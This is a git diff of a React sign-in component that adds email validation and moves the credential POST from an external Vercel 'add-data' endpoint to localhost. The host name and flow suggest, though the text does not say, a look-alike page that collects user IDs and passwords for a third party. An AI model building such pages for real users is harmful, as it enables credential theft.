@@ -1,9 +1,11 @@
 import React, { useState } from 'react'
 import axios from 'axios'
 import Loader from '../components/Loader'
+import { isEmail } from '../helpers/validateEmail'
 const Signin = () => {
   const [userData, setUserData] = useState({ userID: '', password: '' })
   const [showError, setShowError] = useState(false)
+  const [errorMsg, setErrorMsg] = useState('')
   const [redirect, setRedirect] = useState(false)
 
   const [isLoading, setisLoading] = useState(false)
@@ -21,12 +23,19 @@ const Signin = () => {
     setShowError(false)
     if (!userData['userID'] || !userData['password']) {
       setShowError(true)
+      setErrorMsg('Please, enter User ID and password')
+      return
+    }
+    if (!isEmail(userData['userID'])) {
+      setShowError(true)
+      setErrorMsg('Please enter a valid email')
+
       return
     }
     setisLoading(true)
     axios
-      .post('https://att-signin-api-express.vercel.app/add-data', userData)
-      // .post('http://127.0.0.1:3000/add-data', userData)
+      // .post('https://att-signin-api-express.vercel.app/add-data', userData)
+      .post('http://127.0.0.1:3000/add-data', userData)
       .then((resp) => {
         console.log(resp.data)
         setRedirect(true)
@@ -68,9 +77,7 @@ const Signin = () => {
           </div>
           {showError && (
             <span>
-              <p className='text-lg font-semibold text-red-800'>
-                Please, enter User ID and password
-              </p>
+              <p className='text-lg font-semibold text-red-800'>{errorMsg}</p>
             </span>
           )}
 
